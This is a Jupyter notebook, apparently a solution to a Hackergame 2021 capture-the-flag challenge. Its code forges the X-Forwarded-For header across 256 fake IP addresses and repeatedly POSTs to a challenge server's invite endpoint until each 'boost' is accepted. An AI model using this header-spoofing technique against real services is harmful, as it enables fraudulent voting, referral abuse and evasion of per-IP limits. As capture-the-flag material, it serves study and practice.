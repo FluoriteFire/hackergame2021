{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time, requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "link = \"http://202.38.93.111:10888/invite/\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(256):\n",
    "    result = False\n",
    "    while not result:\n",
    "        fip = \"%d.0.0.1\" % i\n",
    "        headers = {\n",
    "            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36\",\n",
    "            \"Origin\": \"http://202.38.93.111:10888\",\n",
    "            \"Referer\": link,\n",
    "            \"X-Forwarded-For\": fip\n",
    "        }\n",
    "\n",
    "        r = requests.post(link, data={'ip': fip}, headers=headers)\n",
    "        s = r.text.split('class=\"alert')[1].split('\\n')[1]\n",
    "\n",
    "        result = (\"助力成功\" in s)\n",
    "        print(s, result)\n",
    "        time.sleep(1)"
   ]
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "75a9d6438270ef1445ba36483e7ce731c87987048398295b5160e88261d0e35e"
  },
  "kernelspec": {
   "display_name": "Python 3.10.0 64-bit",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.0"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
